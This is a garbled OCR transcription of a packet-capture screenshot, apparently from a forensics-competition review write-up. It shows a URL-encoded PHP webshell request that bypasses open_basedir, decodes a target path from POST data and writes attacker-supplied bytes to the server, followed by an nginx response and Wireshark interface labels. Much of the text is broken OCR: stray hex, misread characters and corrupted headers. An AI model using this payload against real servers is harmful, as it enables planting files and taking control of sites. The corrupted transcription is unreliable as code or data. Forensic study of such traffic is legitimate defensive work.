@@ -1,0 +1,49 @@
+# OCR: c476dfc4351defa2940e70003ab9d9cf.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/c476dfc4351defa2940e70003ab9d9cf.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+C5BF 69AE 94AE
+1BB66AL
+TBBE6AE034 A0307044
+321CA1BC21A3267
+D3E841E95E841045D2AFF07504B01
+823F06
+40
+8F88AB0827D8014A5B52AB0027D8815045
+865
+99860606818861865
+einiset(%22display_errors%22%2c%2e%220%22
+384
+5C%2F%2F%22%2C%24opdir）%3B%24ocwd%3Ddirname（%24
+SERVER
+SCRIP
+30961841
+DF8E AEDE
+LO3DAE0 EFC668
+10018004E8F88AB0027D8014E X2xpbi56aXA%3D&peiqi=%4
+5P1it（%22%2F%5C%5C%5C%5C%7C%
+dir%3D%22.29734d27%22%3B%40mkdir(%24tmdir)%3B%4echdir(%24tmdir)%3B%4einiset(%22open
+38%24tm
+ba5edir%22%2C%22..%22)%3Bfor(%24i%3De%3B%24i%3Csizeof(%24oparr
+5et(%22openbasedir%22%2c%22%2F%22)%3B%4ormdir(%24ocwd.%22%2F%22
+hd1e(%22..%223B%7D%481n1
+%38%241
+.%24tmdir)%3B%7D%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dobgetcontents()%3Bobendclean()%3Becho%20%225c%22.%22f34%22%3Becho%20%40asenc(%24output)%3Becho%20%2272f%22.%22cb9%22%3B%7Dob_start()%3Btry%7B%24f%3Dbase64decode（substr（%24P0sT%5B%22o0bdc7ea2574c3%22%5D%2C2))%3B%24c%3D%24P05T%5B%22db3eab3 b3a60bf%22%5D%3B%24c%3Dstr_replace（%22%5Cr%22%2C%22%22%2C%24c）%3B%24c%3Dstrrep1ace（%22%5Cn%22%2C%22%22%2C%24c）%3B%24buf%3D%22%22%3Bfor（%241%3D0%3B%241%3Cstr1en（%24c）%3B%24i%2 B%3D2)%24buf.%3Dur1decode(%22%25%22.substr(%24c%2C%24i%2C2))%3Becho(%40fwrite(fopen(%24f%2C%22a%22)%2C%24buf)%3F%221%22%3A%220%22)%3B%3B%7Dcatch(Exception%28%24e）%7Becho%20%22
+ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3BHTTP/1.12eeOK Server:nginx
+Date:Fri, 04Mar 222 e7:17:12 GMT Content-Type:text/html:charset-UTF-a
+Transfer-Encoding:chunked Connection: close
+Vary:Accept-Encoding Content-Encoding:gzip
+5cf34172fcb9
+分组8180.1客户拥分组，1服务器分组，1tum(sl点击需择
+整个对话（40kB）查找
+504B0506
+V
+Showdata as UTF-8
+滤掉此流
+打印
+另存为.…
+返回
+关闭
+流133岛查找下一个N
+帮助
